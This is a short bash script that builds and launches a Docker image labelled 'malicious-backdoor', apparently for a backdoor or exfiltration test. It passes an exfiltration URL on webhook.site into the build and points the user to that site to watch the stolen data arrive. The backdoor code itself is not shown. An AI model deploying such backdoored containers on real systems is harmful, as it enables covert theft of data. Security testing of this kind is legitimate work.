#!/bin/bash

# Test script to build and run the malicious Docker container

set -e

echo "=== Malicious Docker Backdoor Test ==="
echo ""

# Check if webhook URL is provided
if [ -z "$EXFIL_URL" ]; then
  echo "⚠️  WARNING: EXFIL_URL not set!"
  echo "   Get a unique webhook URL from https://webhook.site"
  echo "   Then run: export EXFIL_URL=https://webhook.site/YOUR_UNIQUE_ID"
  echo ""
  read -p "Continue with default URL? (y/n) " -n 1 -r
  echo
  if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
  fi
  EXFIL_URL="https://webhook.site/unique-id-placeholder"
fi

echo "Using exfiltration URL: $EXFIL_URL"
echo ""

# Build the Docker image
echo "Building Docker image..."
docker build \
  --build-arg EXFIL_URL="$EXFIL_URL" \
  -t malicious-backdoor:test \
  .

echo ""
echo "Build complete!"
echo ""
echo "To run the container:"
echo "  docker run -d --name test-backdoor -p 3000:3000 malicious-backdoor:test"
echo ""
echo "To view logs:"
echo "  docker logs -f test-backdoor"
echo ""
echo "To stop and remove:"
echo "  docker stop test-backdoor && docker rm test-backdoor"
echo ""
echo "Monitor exfiltrated data at: $EXFIL_URL"

